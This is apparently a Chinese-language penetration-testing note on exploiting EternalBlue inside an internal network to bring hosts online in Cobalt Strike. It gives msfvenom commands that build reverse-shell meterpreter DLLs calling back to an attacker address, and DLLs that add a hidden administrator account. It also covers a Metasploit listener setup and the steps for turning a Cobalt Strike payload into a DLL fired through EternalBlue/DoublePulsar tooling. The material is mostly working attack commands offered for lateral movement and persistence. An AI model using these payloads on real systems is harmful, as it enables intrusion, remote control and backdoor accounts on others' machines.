内网有时候没办法了，有入口，但是处于一种尴尬的区域，需要扩大成果，眼前也只有几台永恒之蓝可以打了，没办法了，但是MSF又不太适合维持权限，于是想办法永恒之蓝上线CS。

<a name="22Pz3"></a>
## 前提要求：
1.目标机子出网<br />2.没有开启防火墙、杀软之类<br />3.存在永恒之蓝

<a name="bM2Pv"></a>
## Erebus插件
Erebus→pwn→eterblue<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1623426183486-eff83241-3efa-4d4b-b3f5-38e39ec801fa.png#height=193&id=jJafE&originHeight=257&originWidth=406&originalType=binary&ratio=1&size=19172&status=done&style=none&width=305)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1623426222767-e0cfda24-bc79-4abb-83a5-d0efc5c06b94.png#height=49&id=TCtSv&originHeight=98&originWidth=1914&originalType=binary&ratio=1&size=28630&status=done&style=none&width=957)

<a name="d40JZ"></a>
## Cobalt Strike DLL用于永恒之蓝注入 
参考文章：<br />[http://www.dark5.net/blog/2019/06/26/Cobalt-Strike-DLL%E7%94%A8%E4%BA%8E%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%B3%A8%E5%85%A5/](http://www.dark5.net/blog/2019/06/26/Cobalt-Strike-DLL%E7%94%A8%E4%BA%8E%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%B3%A8%E5%85%A5/)
<a name="uM5uP"></a>
## tips
<a name="lvNOF"></a>
### msf生成dll常见的命令
**x64**<br />msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.116 LPORT=5555 -f dll >x64.dll

**x86**<br />msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx LPORT=4444 -f dll >xxx.dll

**生成 x86的命令执行dll**<br />msfvenom -p windows/exec cmd="net user qaxnb$ Qaxnb123. /add" exitfunc=process -a x86 -f dll > x86.dll

msfvenom -p windows/exec cmd="net localgroup administrators qaxnb$ /add" exitfunc=process -a x86 -f dll > x861.dll  

**生成x64命令执行dll**<br />msfvenom -p windows/x64/exec cmd="net user qaxnb$ Qaxnb123. /add" exitfunc=process -a x64 -f dll > x64.dll  

<a name="FKDuW"></a>
### msf的监听

# use exploit/multi/handler<br /># set payload windows/x64/meterpreter/reverse_tcp<br /># set lhost 192.168.1.116<br /># set lport 5555<br /># exploit


<a name="Qanxx"></a>
## 永恒之蓝上线cs操作：


根据版本选择系统位数的raw<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1623426890787-3c3edd12-2448-4e14-a65d-4180c916f2de.png#height=259&id=RFsOe&originHeight=518&originWidth=1114&originalType=binary&ratio=1&size=357152&status=done&style=none&width=557)<br />生成的payload.bin文件<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1623427029222-179c10cc-c93a-4d1c-bce6-e9ea00ef13fb.png#height=318&id=vmq7g&originHeight=423&originWidth=638&originalType=binary&ratio=1&size=36138&status=done&style=none&width=479)<br />然后利用msf生成对应的dll文件<br />**要注意**
```python
64位
msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x64 --platform windows -f dll -o x64.dll
32位
msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -f dll -o x86.dll
```
生成的x64.dll文件<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1623427221829-c16786f7-384a-493e-957f-d23a3376e72e.png#height=129&id=Z0xXg&originHeight=129&originWidth=768&originalType=binary&ratio=1&size=66568&status=done&style=none&width=768)<br />替换掉ZombieBoyTools中的x64.dll文件<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1623427274952-df05f0b9-764c-4be6-ba5c-e2cb06686b7f.png#height=218&id=eNTSQ&originHeight=291&originWidth=783&originalType=binary&ratio=1&size=38535&status=done&style=none&width=587)<br />Eternablue注意箭头的操作，如果出现win了，就没问题了。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1623427391052-60ddf046-fc06-480a-a451-e64bd4d1695b.png#height=457&id=ldcBJ&originHeight=913&originWidth=718&originalType=binary&ratio=1&size=72690&status=done&style=none&width=359)<br />Double中选好ip和系统位数然后点击Attack<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1623427344839-b77ddb70-8cd2-4ab0-9ce0-b62d1eca5fce.png#height=457&id=VHKka&originHeight=913&originWidth=718&originalType=binary&ratio=1&size=74493&status=done&style=none&width=359)<br />CS成功上线<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1623427479031-9e9095d5-a76a-43b4-ade3-d013e4d57a0e.png#height=450&id=bMaQJ&originHeight=600&originWidth=800&originalType=binary&ratio=1&size=75098&status=done&style=none&width=600)
